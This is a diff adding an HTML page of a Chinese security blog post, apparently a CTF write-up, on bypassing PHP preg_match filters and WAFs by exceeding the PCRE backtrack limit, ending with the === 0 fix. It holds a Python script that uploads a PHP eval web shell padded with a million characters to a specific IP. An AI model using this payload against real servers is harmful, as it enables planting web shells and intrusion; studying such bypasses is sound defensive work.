@@ -1,0 +1,705 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/Decemberus.github-io/img/fluid.png">
+  <link rel="icon" href="/Decemberus.github-io/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Decemberus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="PHP利用PCRE回溯次数限制绕过某些安全限制12345678&lt;?phpfunction is_php($data)&amp;#123;      return preg_match(&amp;#x27;&#x2F;&lt;\?.*[(&#96;;?&gt;].*&#x2F;is&amp;#x27;, $data);  &amp;#125;if(!is_php($input)) &amp;#123;    &#x2F;&#x2F; fwrite($f, $input); ...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP PCRE">
+<meta property="og:url" content="https://decemberus.github.io/Decemberus.github-io/2022/01/09/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E6%9F%90%E4%BA%9B%E5%AE%89%E5%85%A8%E9%99%90%E5%88%B6/index.html">
+<meta property="og:site_name" content="欢迎回来">
+<meta property="og:description" content="PHP利用PCRE回溯次数限制绕过某些安全限制12345678&lt;?phpfunction is_php($data)&amp;#123;      return preg_match(&amp;#x27;&#x2F;&lt;\?.*[(&#96;;?&gt;].*&#x2F;is&amp;#x27;, $data);  &amp;#125;if(!is_php($input)) &amp;#123;    &#x2F;&#x2F; fwrite($f, $input); ...">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="d:/mdimage/image-20221004182355365.png">
+<meta property="og:image" content="d:/mdimage/image-20221004183012814.png">
+<meta property="og:image" content="d:/mdimage/image-20221004183404902.png">
+<meta property="og:image" content="d:/mdimage/ad1ed05b-fab4-4316-96e0-06717ae7b444.829619d9800d.png">
+<meta property="og:image" content="d:/mdimage/e9effb6d-fd43-41aa-9bb8-1aab366649e6.a11361f8009b.png">
+<meta property="og:image" content="d:/mdimage/abf469d4-eb83-416e-8cb3-caa5d59ffb6f.b6586a5d1f9b.png">
+<meta property="article:published_time" content="2022-01-09T13:39:09.000Z">
+<meta property="article:modified_time" content="2023-03-27T15:06:18.791Z">
+<meta property="article:author" content="Decemberus">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="d:/mdimage/image-20221004182355365.png">
+  
+  
+  <title>PHP PCRE - 欢迎回来</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/Decemberus.github-io/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/Decemberus.github-io/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/Decemberus.github-io/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"decemberus.github.io","root":"/Decemberus.github-io/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/Decemberus.github-io/local-search.xml"};
+  </script>
+  <script  src="/Decemberus.github-io/js/utils.js" ></script>
+  <script  src="/Decemberus.github-io/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/Decemberus.github-io/">
+      <strong>enjoy的blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Decemberus.github-io/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Decemberus.github-io/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Decemberus.github-io/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Decemberus.github-io/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Decemberus.github-io/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/Decemberus.github-io/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="PHP PCRE"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-01-09 21:39" pubdate>
+          2022年1月9日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          24 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">PHP PCRE</h1>
+            
+            <div class="markdown-body">
+              
+              <h1 id="PHP利用PCRE回溯次数限制绕过某些安全限制"><a href="#PHP利用PCRE回溯次数限制绕过某些安全限制" class="headerlink" title="PHP利用PCRE回溯次数限制绕过某些安全限制"></a>PHP利用PCRE回溯次数限制绕过某些安全限制</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);  <br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_php</span>(<span class="hljs-variable">$input</span>)) &#123;<br>    <span class="hljs-comment">// fwrite($f, $input); ...</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="什么是正则表达式"><a href="#什么是正则表达式" class="headerlink" title="什么是正则表达式"></a>什么是正则表达式</h2><p>正则表达式是一个可以被“有限状态自动机”接受的语言类。</p>
+<p>“有限状态自动机”，其拥有有限数量的状态，每个状态可以迁移到零个或多个状态，输入字串决定执行哪个状态的迁移。</p>
+<p>而常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是：</p>
+<ul>
+<li>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</li>
+<li>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</li>
+</ul>
+<p>由于NFA的执行过程存在回溯，所以其性能会劣于DFA，但它支持更多功能。大多数程序语言都使用了NFA作为正则引擎，其中也包括PHP使用的PCRE库。</p>
+<h2 id="回溯的过程是什么样子的"><a href="#回溯的过程是什么样子的" class="headerlink" title="回溯的过程是什么样子的"></a>回溯的过程是什么样子的</h2><p>所以，我们题目中的正则<code>&lt;\?.*[(;?&gt;].*</code>，假设匹配的输入是<code>&lt;?php phpinfo();//aaaaa</code>，实际执行流程是这样的：</p>
+<p><img src="D:\mdimage\image-20221004182355365.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20221004182355365"> </p>
+<p>见上图，可见第4步的时候，因为第一个<code>.*</code>可以匹配任何字符，所以最终匹配到了输入串的结尾，也就是<code>//aaaaa</code>。但此时显然是不对的，因为正则显示<code>.*</code>后面还应该有一个字符[(&#96;;?&gt;]。</p>
+<p>所以NFA就开始回溯，先吐出一个<code>a</code>，输入变成第5步显示的<code>//aaaa</code>，但仍然匹配不上正则，继续吐出<code>a</code>，变成<code>//aaa</code>，仍然匹配不上……</p>
+<p>最终直到吐出<code>;</code>，输入变成第12步显示的<code>&lt;?php phpinfo()</code>，此时，<code>.*</code>匹配的是<code>php phpinfo()</code>，而后面的<code>;</code>则匹配上<code>[(</code>;?&gt;]<code>，这个结果满足正则表达式的要求，于是不再回溯。13步开始向后匹配</code>;<code>，14步匹配</code>.<em><code>，第二个</code>.</em>&#96;匹配到了字符串末尾，最后结束匹配。</p>
+<p>在调试正则表达式的时候，我们可以查看当前回溯的次数：</p>
+<p><img src="D:\mdimage\image-20221004183012814.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20221004183012814"> </p>
+<p>这里回溯了8次。</p>
+<h2 id="PHP的pcre-backtrack-limit限制利用"><a href="#PHP的pcre-backtrack-limit限制利用" class="headerlink" title="PHP的pcre.backtrack_limit限制利用"></a>PHP的pcre.backtrack_limit限制利用</h2><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限：</p>
+<p><img src="D:\mdimage\image-20221004183404902.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20221004183404902"> </p>
+<p>这里我用的是windows的powershell，phpstrom的shell不知道为什么不可以</p>
+<p>可见，回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万，会出现什么现象呢？比如：</p>
+<p><img src="D:\mdimage\ad1ed05b-fab4-4316-96e0-06717ae7b444.829619d9800d.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image.png"></p>
+<p>我们发送上述图片中的代码</p>
+<p>可见，<code>preg_match</code>返回的非1和0，而是false。</p>
+<p><code>preg_match</code>函数返回false表示此次执行失败了，我们可以调用<code>var_dump(preg_last_error() === PREG_BACKTRACK_LIMIT_ERROR);</code>，发现失败的原因的确是回溯次数超出了限制：</p>
+<p><img src="D:\mdimage\e9effb6d-fd43-41aa-9bb8-1aab366649e6.a11361f8009b.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image.png"> </p>
+<p>所以，这道题的答案就呼之欲出了。我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br>files = &#123;<br>  <span class="hljs-string">&#x27;file&#x27;</span>: BytesIO(<span class="hljs-string">b&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1000000</span>)<br>&#125;<br><br>res = requests.post(<span class="hljs-string">&#x27;http://51.158.75.42:8088/index.php&#x27;</span>, files=files, allow_redirects=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(res.headers)<br></code></pre></td></tr></table></figure>
+
+<p>解释一下BytesIO</p>
+<p>StringIO操作的只能是str，如果要操作二进制数据，就需要使用BytesIO。</p>
+<p>BytesIO实现了在内存中读写bytes，我们创建一个BytesIO，然后写入一些bytes：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-meta">&gt;&gt;&gt; </span>f = BytesIO()<br><span class="hljs-meta">&gt;&gt;&gt; </span>f.write(<span class="hljs-string">&#x27;中文&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-number">6</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(f.getvalue())<br><span class="hljs-string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="PCRE的另一种绕过方法"><a href="#PCRE的另一种绕过方法" class="headerlink" title="PCRE的另一种绕过方法"></a>PCRE的另一种绕过方法</h2><p>延伸一下，很多基于PHP的WAF，如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/SELECT.+FROM.+/is&#x27;</span>, <span class="hljs-variable">$input</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;SQL Injection&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>均存在上述问题，通过大量回溯可以进行绕过。</p>
+<p>另外，我遇到更常见的一种WAF是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="hljs-variable">$input</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;SQL Injection&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里涉及到了正则表达式的“非贪婪模式”。在NFA中，如果我输入<code>UNION/*aaaaa*/SELECT</code>，这个正则表达式执行流程如下：</p>
+<ul>
+<li><code>.+?</code>匹配到<code>/</code></li>
+<li>因为非贪婪模式，所以<code>.+?</code>停止匹配，而由<code>S</code>匹配<code>*</code></li>
+<li><code>S</code>匹配<code>*</code>失败，回溯，再由<code>.+?</code>匹配<code>*</code></li>
+<li>因为非贪婪模式，所以<code>.+?</code>停止匹配，而由<code>S</code>匹配<code>a</code></li>
+<li><code>S</code>匹配<code>a</code>失败，回溯，再由<code>.+?</code>匹配<code>a</code></li>
+<li>…</li>
+</ul>
+<p>回溯次数随着a的数量增加而增加。所以，我们仍然可以通过发送大量a，来使回溯次数超出<code>pcre.backtrack_limit</code>限制，进而绕过WAF：</p>
+<p><img src="D:\mdimage\abf469d4-eb83-416e-8cb3-caa5d59ffb6f.b6586a5d1f9b.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image.png"></p>
+<p>那么，如何修复这个问题呢？</p>
+<p>其实如果我们仔细观察PHP文档，是可以看到<code>preg_match</code>函数下面的警告的：</p>
+<p>如果用<code>preg_match</code>对字符串进行匹配，一定要使用<code>===</code>全等号来判断返回值，如：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">function</span> is_php(<span class="hljs-variable">$data</span>)&#123;  <br>    return preg_match(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);  <br>&#125;<br><br><span class="hljs-keyword">if</span>(is_php(<span class="hljs-variable">$input</span>) === <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-regexp">//</span> fwrite(<span class="hljs-variable">$f</span>, <span class="hljs-variable">$input</span>); ...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这样，即使正则执行失败返回false，也不会进入if语句。</p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>PHP PCRE</div>
+      <div>https://decemberus.github.io/Decemberus.github-io/2022/01/09/PHP利用PCRE回溯次数限制绕过某些安全限制/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Decemberus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年1月9日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/Decemberus.github-io/2022/01/09/%E6%B5%85%E8%B0%88PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%AD%E5%87%BA%E7%8E%B0%E8%BF%87%E6%BB%A4%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95/" title="PHP变量覆盖漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHP变量覆盖漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Decemberus.github-io/2021/12/31/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="phar反序列化">
+                        <span class="hidden-mobile">phar反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/Decemberus.github-io/js/events.js" ></script>
+<script  src="/Decemberus.github-io/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/Decemberus.github-io/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/Decemberus.github-io/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/Decemberus.github-io/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
